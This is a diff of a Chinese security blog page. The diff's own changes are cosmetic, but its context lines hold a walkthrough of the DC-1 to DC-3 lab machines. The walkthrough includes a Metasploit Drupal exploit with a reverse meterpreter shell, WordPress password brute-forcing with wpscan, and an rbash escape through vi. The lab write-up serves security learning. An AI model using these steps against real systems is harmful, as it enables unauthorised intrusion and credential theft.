@@ -6,34 +6,17 @@
   <meta name="keywords" content=" nmap , ISW , 渗透 , wpscan , rbash , 提权 , cewl ">
   <meta name="description" content="渗透学习-DC靶场 | MIXBP">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="docker学习初识docker安装docker12345678910# yum包更新yum update# 安装所需要的软件包yum install -y yum-utils device-mapper-persistent-date lvm2# 设置yum源yum-config-manager --add-repo https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;cento">
-<meta property="og:type" content="article">
-<meta property="og:title" content="docker学习">
-<meta property="og:url" content="https://mixbp.github.io/2026/09/14/docker%E5%AD%A6%E4%B9%A0/index.html">
+<meta name="description" content="关于我MIXBP，Web 安全学习者，主攻 CTF Web 方向。  🎯 常打 BUUCTF、ctfshow、各类线下&#x2F;线上赛 📚 学习方向：PHP&#x2F;Java&#x2F;Python 安全、渗透测试、代码审计 🔗 GitHub：MIXBP  关于博客记录 CTF 刷题 writeup、比赛复现与安全学习笔记，内容仅供学习交流。 转载请注明来源，欢迎对文章中的引用来源进行考">
+<meta property="og:type" content="website">
+<meta property="og:title" content="about">
+<meta property="og:url" content="https://mixbp.github.io/about/index.html">
 <meta property="og:site_name" content="MIXBP">
-<meta property="og:description" content="docker学习初识docker安装docker12345678910# yum包更新yum update# 安装所需要的软件包yum install -y yum-utils device-mapper-persistent-date lvm2# 设置yum源yum-config-manager --add-repo https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;cento">
+<meta property="og:description" content="关于我MIXBP，Web 安全学习者，主攻 CTF Web 方向。  🎯 常打 BUUCTF、ctfshow、各类线下&#x2F;线上赛 📚 学习方向：PHP&#x2F;Java&#x2F;Python 安全、渗透测试、代码审计 🔗 GitHub：MIXBP  关于博客记录 CTF 刷题 writeup、比赛复现与安全学习笔记，内容仅供学习交流。 转载请注明来源，欢迎对文章中的引用来源进行考">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-1.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-2.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-3.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-5.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-4.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-6.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-7.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-8.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-9.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-10.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-11.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-12.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-13.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-14.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-15.png">
-<meta property="article:published_time" content="2026-09-14T04:28:32.000Z">
-<meta property="article:modified_time" content="2026-09-18T11:22:32.136Z">
+<meta property="article:published_time" content="2026-11-16T09:30:00.000Z">
+<meta property="article:modified_time" content="2026-11-16T09:08:41.064Z">
 <meta property="article:author" content="MIXBP">
-<meta property="article:tag" content="docker">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-1.png">
 
 
 <link rel="icon" href="/img/favicon.png">
@@ -58,7 +41,8 @@
 
 <script src="/js/iconfont.js?v=1.1.0" ></script>
 
-<meta name="generator" content="Hexo 7.3.0"></head>
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="MIXBP" type="application/atom+xml">
+</head>
 <div style="display: none">
   <input class="theme_disqus_on" value="false">
   <input class="theme_preload_comment" value="">
@@ -2215,7 +2199,7 @@
         
         <a  class="全部文章 java安全学习 "
            href="/2026/05/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9B%E9%98%B6/"
-           data-tag="java反序列化,JNDI,RMI"
+           data-tag="JNDI,RMI,java反序列化"
            data-author="" >
             <span class="post-title" title="java反序列化进阶">java反序列化进阶</span>
             <span class="post-date" title="2026-05-07 01:23:24">2026/05/07</span>
@@ -2737,7 +2721,7 @@
         
         <a  class="全部文章 比赛复现 "
            href="/2025/05/22/%E2%80%9C%E8%BD%A9%E8%BE%95%E6%9D%AF%E2%80%9D%E4%BA%91%E7%9B%BE%E7%A0%BA%E5%89%91CTF%E6%8C%91%E6%88%98%E8%B5%9B%E5%A4%8D%E7%8E%B0/"
-           data-tag="ssti,RCE,ssrf,sql"
+           data-tag="ssti,ssrf,RCE,sql"
            data-author="" >
             <span class="post-title" title="“轩辕杯”云盾砺剑CTF挑战赛复现">“轩辕杯”云盾砺剑CTF挑战赛复现</span>
             <span class="post-date" title="2025-05-22 23:37:59">2025/05/22</span>
@@ -2800,7 +2784,7 @@
         
         <a  class="全部文章 刷题笔记 "
            href="/2025/05/20/watevrCTF-2019-PickleStore/"
-           data-tag="反弹shell,python反序列化,外带数据,pickle反序列化"
+           data-tag="python反序列化,反弹shell,外带数据,pickle反序列化"
            data-author="" >
             <span class="post-title" title="watevrCTF-2019-PickleStore">watevrCTF-2019-PickleStore</span>
             <span class="post-date" title="2025-05-20 16:38:08">2025/05/20</span>
@@ -2872,7 +2856,7 @@
         
         <a  class="全部文章 刷题笔记 "
            href="/2025/05/11/SWPU2019-Web4/"
-           data-tag="代码审计,堆叠注入,时间盲注,16进制加SQL预处理绕过,PDO"
+           data-tag="代码审计,堆叠注入,16进制加SQL预处理绕过,时间盲注,PDO"
            data-author="" >
             <span class="post-title" title="SWPU2019-Web4">SWPU2019-Web4</span>
             <span class="post-date" title="2025-05-11 21:25:26">2025/05/11</span>
@@ -3169,7 +3153,7 @@
         
         <a  class="全部文章 刷题笔记 "
            href="/2025/04/15/BJDCTF2020-EzPHP/"
-           data-tag="代码审计,php特性,sha1绕过,extract,$_SERVER[&#39;QUERY_STRING&#39;],preg_match,create_function(),取反绕过单双引号过滤"
+           data-tag="php特性,代码审计,sha1绕过,extract,$_SERVER[&#39;QUERY_STRING&#39;],preg_match,create_function(),取反绕过单双引号过滤"
            data-author="" >
             <span class="post-title" title="BJDCTF2020-EzPHP">BJDCTF2020-EzPHP</span>
             <span class="post-date" title="2025-04-15 22:02:22">2025/04/15</span>
@@ -3187,7 +3171,7 @@
         
         <a  class="全部文章 比赛复现 "
            href="/2025/04/15/TGCTF-2025%E5%A4%8D%E7%8E%B0/"
-           data-tag="sql注入,RCE,upload,明文攻击,CVE,目录穿越,内存马,时间盲注,压缩文件修复,时间帧隐写,docker"
+           data-tag="sql注入,upload,RCE,明文攻击,时间盲注,CVE,目录穿越,内存马,压缩文件修复,时间帧隐写,docker"
            data-author="" >
             <span class="post-title" title="TGCTF-2025复现">TGCTF-2025复现</span>
             <span class="post-date" title="2025-04-15 14:10:07">2025/04/15</span>
@@ -3376,7 +3360,7 @@
         
         <a  class="全部文章 刷题笔记 "
            href="/2025/03/30/BJDCTF2020-EasySearch1/"
-           data-tag="swp泄露,md5碰撞,代码审计,Apache SSI 远程命令执行漏洞"
+           data-tag="代码审计,swp泄露,md5碰撞,Apache SSI 远程命令执行漏洞"
            data-author="" >
             <span class="post-title" title="BJDCTF2020-EasySearch1">BJDCTF2020-EasySearch1</span>
             <span class="post-date" title="2025-03-30 14:24:01">2025/03/30</span>
@@ -4003,6 +3987,7 @@
     <div class="article-meta">
         
         <span>字数:13.7k</span>
+        <span>预计阅读 63 分钟</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -4069,7 +4054,7 @@
 <td>只扫描80端口</td>
 </tr>
 </tbody></table>
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-1.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-1.png"></p>
 <p>可以看到存活主机5台以及端口状态</p>
 <hr>
 <h4 id="三种端口状态"><a href="#三种端口状态" class="headerlink" title="三种端口状态"></a>三种端口状态</h4><table>
@@ -4101,7 +4086,7 @@
 <h4 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sP <span class="hljs-number">192.168.234.0</span>/<span class="hljs-number">24</span> <br><br><span class="hljs-comment"># -sP这个选项是用来指定一个主机发现方法。</span><br></code></pre></td></tr></table></figure>
 
 <p>靶机端口扫描，开放了22、80、111、34471端口</p>
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-2.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-2.png"></p>
 <hr>
 <h4 id="和指定端口扫描的区别："><a href="#和指定端口扫描的区别：" class="headerlink" title="和指定端口扫描的区别："></a><strong>和指定端口扫描的区别：</strong></h4><p><strong><code>-sP</code><strong>：只找</strong>哪些主机在线</strong>（不扫描端口）</p>
 <p><strong><code>-p 80</code><strong>：找</strong>哪些主机的80端口开放</strong>（有Web服务）</p>
@@ -4119,12 +4104,12 @@
 <h2 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a><strong>漏洞探测</strong></h2><p>使用<code>whatweb</code>（kali自带）指纹识别，找到目标cms的版本和其他信息</p>
 <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">whatweb</span> -v <span class="hljs-number">192.168.234.130</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-3.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-3.png"></p>
 <hr>
 <h2 id="msf漏洞利用"><a href="#msf漏洞利用" class="headerlink" title="msf漏洞利用"></a>msf漏洞利用</h2><p>msf漏洞利用，直接搜索<code>Drupal</code>这些模块</p>
 <figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">msfconsole</span><br><span class="hljs-attribute">search Drupal</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-4.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-4.png"></p>
 <p>使用第一个模块试试，显示这个模块的所有payload，都是反弹和正向连接的，没有我们需要的</p>
 <figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-keyword">show</span> payloads<br></code></pre></td></tr></table></figure>
 
@@ -4132,7 +4117,7 @@
 <figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-keyword">use</span> unix/webapp/drupal_drupalgeddon2<br><span class="hljs-meta"># 或者</span><br><span class="hljs-keyword">use</span> <span class="hljs-number">1</span><br><span class="hljs-meta"># 然后</span><br><span class="hljs-keyword">show</span> payloads <span class="hljs-meta"># 显示该模块下的所有payload</span><br></code></pre></td></tr></table></figure>
 
 <p>发现这些东西，和php有关，而且能反弹到我们meterpreter后渗透模块中</p>
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-5.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-5.png"></p>
 <p>设置payload为tcp反弹shell</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> payload payload/php/meterpreter/reverse_tcp<br></code></pre></td></tr></table></figure>
 
@@ -4167,7 +4152,7 @@
 <p>他说下一步要找一个cms的配置文件，一般配置文件都是settings.xxx，这里我们从当前目录模糊查询一下</p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> . -name <span class="hljs-string">&#x27;set*&#x27;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-6.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-6.png"></p>
 <p>又给了一个提示</p>
 <figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">What can you <span class="hljs-keyword">do</span> <span class="hljs-keyword">with</span> these credentials?<br><br>你能用这些凭证做什么？<br></code></pre></td></tr></table></figure>
 
@@ -4176,7 +4161,7 @@
 <p>很明显可以去连接本地数据库</p>
 <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">mysql</span> -udbuser -pR0ck3t<br></code></pre></td></tr></table></figure>
 
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-7.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-7.png"></p>
 <p>查看所有数据库</p>
 <figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">show databases<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
 
@@ -4190,7 +4175,7 @@
 <p>这样子不好看，那么我们就加一个\G</p>
 <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">select</span> * <span class="hljs-selector-tag">from</span> users\<span class="hljs-selector-tag">G</span>;<br></code></pre></td></tr></table></figure>
 
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-8.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-8.png"></p>
 <p>不知道是什么加密，那么我们只能去找这个hash规则的文件了</p>
 <p>当前站点目录查找这个文件，并发现有一个<strong>password-hash.sh</strong>文件</p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> . -name <span class="hljs-string">&#x27;*hash*&#x27;</span><br></code></pre></td></tr></table></figure>
@@ -4215,9 +4200,9 @@
 
 <p>登录即可</p>
 <p>这里我们就在content里找到了flag3</p>
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-9.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-9.png"></p>
 <p>点进去之后发现提示</p>
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-10.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-10.png"></p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">特殊的 PERMS 权限将帮助您 <span class="hljs-built_in">FIND</span> 到 passwd 文件 - 但您需要使用 -exec 执行该命令，来弄清楚如何获取 shadow 文件中的内容。<br></code></pre></td></tr></table></figure>
 
 <p>提示我们去passwd，找到flag4</p>
@@ -4322,7 +4307,7 @@
 <h2 id="全端口扫描"><a href="#全端口扫描" class="headerlink" title="全端口扫描"></a>全端口扫描</h2><p>对扫描出的靶机进行全端口扫描</p>
 <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -sS -p- <span class="hljs-number">192.168.234.131</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-11.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-11.png"></p>
 <p>看到80端口有http服务，然后尝试去访问，但是发现访问这个ip的时候，自动跳转到了<code>http://dc-2</code></p>
 <figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">192.168.234.131</span>/dc-<span class="hljs-number">2</span>/<br></code></pre></td></tr></table></figure>
 
@@ -4330,7 +4315,7 @@
 <p>index.php可以正常访问</p>
 <figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//192.168.234.131/index.php</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-12.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-12.png"></p>
 <p>那么应该就是host文件问题，修改hosts <code>C:\Windows\System32\drivers\etc\hosts</code>在行尾添加这一行内容</p>
 <figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">192.168.234.131</span> dc-<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>
 
@@ -4340,7 +4325,7 @@
 <p>现在访问 <code>dc-2</code> 就会解析到 <code>192.168.234.131</code>。</p>
 <hr>
 <p>flag1</p>
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-13.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-13.png"></p>
 <p>“Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.”</p>
 <p>大致意思就是你可能需要cewl这款工具</p>
 <p>看目录扫描结果，这是一个<code>wordpress</code>网站，有一个后台界面<code>wp-admin</code></p>
@@ -4354,13 +4339,13 @@
 <p>我们将扫描结果重定向到<code>passwd.txt</code>（就是保存文件或者使用<code>cewl</code>的自带的<code>-m</code>参数）</p>
 <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">cewl</span> http://dc-2/ &gt; passwd.txt<br></code></pre></td></tr></table></figure>
 
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-14.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-14.png"></p>
 <h2 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">WPScan是一个扫描 WordPress 漏洞的黑盒子扫描器，它可以为所有 Web 开发人员扫描 WordPress 漏洞并在他们开发前找到并解决问题。<br></code></pre></td></tr></table></figure>
 
 <p>使用<code>wpscan</code>枚举可能的用户名</p>
 <figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">wpscan <span class="hljs-params">--url</span> http:<span class="hljs-string">//dc-2/</span> -e u<br></code></pre></td></tr></table></figure>
 
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-15.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-15.png"></p>
 <p>一共扫描出来三个用户admin，jerry，tom可以使用</p>
 <p>此时我们已经有了用户名和密码字典</p>
 <h2 id="wpscan爆破账号密码"><a href="#wpscan爆破账号密码" class="headerlink" title="wpscan爆破账号密码"></a>wpscan爆破账号密码</h2><p>使用<code>wpscan</code>爆破账号密码，指定刚刚我们生成的用户字典<code>users.txt</code>和密码字典<code>passwd.txt</code></p>
@@ -4369,10 +4354,10 @@
 <p>爆破成功，结果如下</p>
 <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">jerry</span> / adipiscing<br>tom / parturient<br></code></pre></td></tr></table></figure>
 
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-16.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-16.png"></p>
 <p>然后登录成功</p>
 <p>在旁边导航栏找到了Pages，即可得到flag2</p>
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-17.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-17.png"></p>
 <p>提示</p>
 <figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-keyword">If</span> you can<span class="hljs-comment">&#x27;t exploit WordPress and take a shortcut, there is another way.Hope you found another entry point.</span><br><br>如果 WordPress 无法直接利用，可以寻找其他入口点。<br></code></pre></td></tr></table></figure>
 
@@ -4381,7 +4366,7 @@
 <p>只能上传图片文件，并且没有文件包含，尝试文件名后缀爆破也失败了</p>
 <hr>
 <h2 id="系统渗透"><a href="#系统渗透" class="headerlink" title="系统渗透"></a><strong>系统渗透</strong></h2><p>之前我们换端口扫描的时候有一个7744端口</p>
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-11.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-11.png"></p>
 <p>用<code>ssh</code>默认22端口是拒绝服务的</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span> root@<span class="hljs-number">192.168.234.131</span><br><span class="hljs-attribute">ssh</span>: connect to host <span class="hljs-number">192.168.234.131</span> port <span class="hljs-number">22</span>: Connection refused<br></code></pre></td></tr></table></figure>
 
@@ -4402,7 +4387,7 @@
 <p>使用ls命令发现flag3.txt</p>
 <p>尝试用cat去读取</p>
 <p>但是显示找不到命令</p>
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-18.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-18.png"></p>
 <h3 id="查看可用的命令"><a href="#查看可用的命令" class="headerlink" title="查看可用的命令"></a>查看可用的命令</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">compgen -c</span><br></code></pre></td></tr></table></figure>
 
 <p>滑到最下面，有一个vi命令</p>
@@ -4424,7 +4409,7 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> /home<br><span class="hljs-built_in">ls</span> /home/jerry<br></code></pre></td></tr></table></figure>
 
 <p>直接找到了flag4</p>
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-19.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-19.png"></p>
 <p>告诉我们使用<code>git</code>离开这里，应该就是让我们用<code>git</code>提权</p>
 <p>查看文件所属，是jerry的，这里直接跳过吧，找到就好，没什么作用了</p>
 <p>我们看看刚刚的flag3.txt，所属用户为tom</p>
@@ -4433,7 +4418,7 @@
 <p>那么就用它提权试试</p>
 <h3 id="vi提权"><a href="#vi提权" class="headerlink" title="vi提权"></a>vi提权</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">:<span class="hljs-built_in">set</span> <span class="hljs-attribute">shell</span>=/bin/bash<br>:shell<br></code></pre></td></tr></table></figure>
 
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-20.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-20.png"></p>
 <p>这里直接”提权”成功了</p>
 <p>但是没什么作用哈，root目录也切换不了</p>
 <h3 id="查看环境变量"><a href="#查看环境变量" class="headerlink" title="查看环境变量"></a>查看环境变量</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> -p<br><br><br><span class="hljs-comment">#</span><br>tom@DC-2:~$ <span class="hljs-built_in">export</span> -p<br>declare -x <span class="hljs-attribute">HOME</span>=<span class="hljs-string">&quot;/home/tom&quot;</span><br>declare -x <span class="hljs-attribute">LANG</span>=<span class="hljs-string">&quot;en_US.UTF-8&quot;</span><br>declare -x <span class="hljs-attribute">LOGNAME</span>=<span class="hljs-string">&quot;tom&quot;</span><br>declare -x <span class="hljs-attribute">MAIL</span>=<span class="hljs-string">&quot;/var/mail/tom&quot;</span><br>declare -x OLDPWD<br>declare -x <span class="hljs-attribute">PATH</span>=<span class="hljs-string">&quot;/home/tom/usr/bin&quot;</span><br>declare -x <span class="hljs-attribute">PWD</span>=<span class="hljs-string">&quot;/home/tom&quot;</span><br>declare -x <span class="hljs-attribute">SHELL</span>=<span class="hljs-string">&quot;/bin/rbash&quot;</span><br>declare -x <span class="hljs-attribute">SHLVL</span>=<span class="hljs-string">&quot;2&quot;</span><br>declare -x <span class="hljs-attribute">SSH_CLIENT</span>=<span class="hljs-string">&quot;192.168.234.128 43886 7744&quot;</span><br>declare -x <span class="hljs-attribute">SSH_CONNECTION</span>=<span class="hljs-string">&quot;192.168.234.128 43886 192.168.234.131 7744&quot;</span><br>declare -x <span class="hljs-attribute">SSH_TTY</span>=<span class="hljs-string">&quot;/dev/pts/0&quot;</span><br>declare -x <span class="hljs-attribute">TERM</span>=<span class="hljs-string">&quot;xterm-256color&quot;</span><br>declare -x <span class="hljs-attribute">USER</span>=<span class="hljs-string">&quot;tom&quot;</span><br>declare -x <span class="hljs-attribute">VIM</span>=<span class="hljs-string">&quot;/usr/share/vim&quot;</span><br>declare -x <span class="hljs-attribute">VIMRUNTIME</span>=<span class="hljs-string">&quot;/usr/share/vim/vim74&quot;</span><br></code></pre></td></tr></table></figure>
@@ -4454,18 +4439,18 @@
 <hr>
 <h1 id="DC-3靶机"><a href="#DC-3靶机" class="headerlink" title="DC-3靶机"></a>DC-3靶机</h1><h2 id="主机发现-1"><a href="#主机发现-1" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -sP <span class="hljs-number">192.168.234.0</span>/<span class="hljs-number">24</span><br>或者<br>nmap -sP <span class="hljs-number">192.168.234.0</span>-<span class="hljs-number">255</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-21.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-21.png"></p>
 <hr>
 <h2 id="端口快速扫描"><a href="#端口快速扫描" class="headerlink" title="端口快速扫描"></a>端口快速扫描</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -sS <span class="hljs-number">192.168.234.132</span> -p-<br></code></pre></td></tr></table></figure>
 
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-22.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-22.png"></p>
 <p>发现有80端口服务，并快速找到编程语言为PHP语言</p>
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-23.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-23.png"></p>
 <p>御剑扫描</p>
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-24.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-24.png"></p>
 <hr>
 <h2 id="joomla"><a href="#joomla" class="headerlink" title="joomla"></a>joomla</h2><p>后台界面</p>
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-25.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-25.png"></p>
 <p>发现是joomla</p>
 <p>安装 joomscan 这个工具</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt install joomscan<br></code></pre></td></tr></table></figure>
@@ -4473,7 +4458,7 @@
 <p>检索这个joomla版本信息是3.7.0</p>
 <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">joomscan</span> -u <span class="hljs-number">192.168.234.132</span><br></code></pre></td></tr></table></figure>
 
